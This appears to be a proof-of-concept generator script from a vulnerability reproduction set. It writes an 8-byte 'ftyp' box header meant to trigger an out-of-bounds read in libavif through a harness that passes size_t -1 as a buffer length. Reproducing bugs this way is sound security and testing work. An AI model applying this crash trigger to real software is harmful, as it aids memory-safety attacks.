#!/usr/bin/env python3
"""Generate PoC for libavif-jni-signext.

The harness mimics the Android JNI bug by calling avifDecoderSetIOMemory()
with size=(size_t)-1 on a small heap buffer copy of `data`. avifDecoderParse
then reads off the end. Any input >= 4 bytes (so it gets past the harness
length filter) triggers the bug — we use an 'ftyp' box stub as a
representative payload that mimics what the upstream issue body's
JNI reproducer used.
"""

def create_poc(output='poc.bin'):
    # 8-byte minimal 'ftyp' box header (matches the upstream Android repro).
    blob = bytes([0, 0, 0, 16, ord('f'), ord('t'), ord('y'), ord('p')])
    with open(output, 'wb') as f:
        f.write(blob)
    print(f"wrote {output} ({len(blob)} bytes)")


if __name__ == '__main__':
    create_poc()
